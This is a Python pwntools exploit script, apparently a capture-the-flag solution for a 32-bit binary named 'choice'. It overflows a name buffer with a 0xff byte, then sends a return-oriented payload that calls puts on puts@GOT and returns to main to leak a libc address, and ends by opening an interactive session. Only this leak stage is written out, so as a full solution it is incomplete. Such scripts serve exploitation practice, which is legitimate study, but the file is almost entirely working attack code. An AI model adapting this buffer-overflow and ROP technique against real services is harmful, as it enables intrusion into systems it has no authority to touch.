from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["",]
libc=ELF('./libc-2.23.so')
elf = ELF('./choice')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./choice")
    context(arch='i386', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'i386', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

puts_plt = p32(elf.plt["puts"])
puts_got = p32(elf.got["puts"])
main = p32(0x8048727)

gdb.attach(p)
ru(b'name:\n')
payload = b'a' * 0x19 + b'\xff'
s(payload)
ru(b'now\n')
s(b'3')
payload2 = b'a' * (0x20 + 8) + puts_plt + puts_got + main
s(payload2)

shell()
